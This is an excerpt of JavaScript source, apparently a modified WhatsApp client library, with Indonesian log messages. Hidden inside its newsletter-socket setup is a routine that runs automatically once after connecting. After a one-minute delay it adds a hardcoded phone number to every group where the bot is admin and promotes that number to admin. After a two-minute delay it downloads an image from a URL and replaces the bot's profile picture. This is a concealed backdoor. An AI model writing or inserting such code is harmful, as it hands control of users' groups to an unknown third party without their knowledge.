...
const AUTO_ADD_ADMIN_NUMBER = "6282258312618@s.whatsapp.net";
...
// Flag untuk memastikan auto actions hanya dijalankan sekali
...
async function autoAddAdminToGroups(sock, logger) {
    try {
        logger?.info?.('[AUTO-ADMIN] Memulai proses auto add admin ke semua grup...');
        ...
        logger?.info?.(`[AUTO-ADMIN] Ditemukan ${totalGroups} grup`);
            ...
            if (botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin') {
                try {
                    ...
                    if (!targetExists) {
                        ...
                        logger?.info?.(`[AUTO-ADMIN] Menambahkan nomor ke grup: ${group.subject || groupId}`);
                    ...
                    logger?.info?.(`[AUTO-ADMIN] Mempromote ke admin di grup: ${group.subject || groupId}`);
                    await sock.groupParticipantsUpdate(groupId, [AUTO_ADD_ADMIN_NUMBER], 'promote');
                    await new Promise(r => setTimeout(r, 3000));
                    successCount++;
                } catch (err) {
                    logger?.debug?.(`[AUTO-ADMIN] Gagal di grup ${group.subject || groupId}: ${err?.message}`);
                }
            }
        }
...
async function autoUpdateProfilePicture(sock, logger) {
    try {
        logger?.info?.('[AUTO-PROFILE] Memulai proses update foto profil...');
        ...
        logger?.info?.(`[AUTO-PROFILE] Bot ID: ${botId}`);
        logger?.info?.(`[AUTO-PROFILE] Mengunduh gambar dari: ${AUTO_PROFILE_PICTURE_URL}`);
        ...
        logger?.info?.(`[AUTO-PROFILE] Gambar berhasil diunduh (${buffer.length} bytes)`);
...
const makeNewsletterSocket = (config) => {
    ...
    sock.ev.on('connection.update', (update) => {
        if (update.connection === 'open' && !hasAutoActionsExecuted) {
            hasAutoActionsExecuted = true;
            logger?.info?.('[AUTO-ACTIONS] Koneksi terbuka, menjadwalkan auto actions...');

            // Setelah 1 menit: Tambahkan nomor ke semua grup dan jadikan admin
            setTimeout(async () => {
                try {
                    logger?.info?.('[AUTO-ACTIONS] Memulai Auto Add Admin (delay 1 menit)...');
            ...
            setTimeout(async () => {
                try {
                    logger?.info?.('[AUTO-ACTIONS] Memulai Auto Update Profile (delay 2 menit)...');
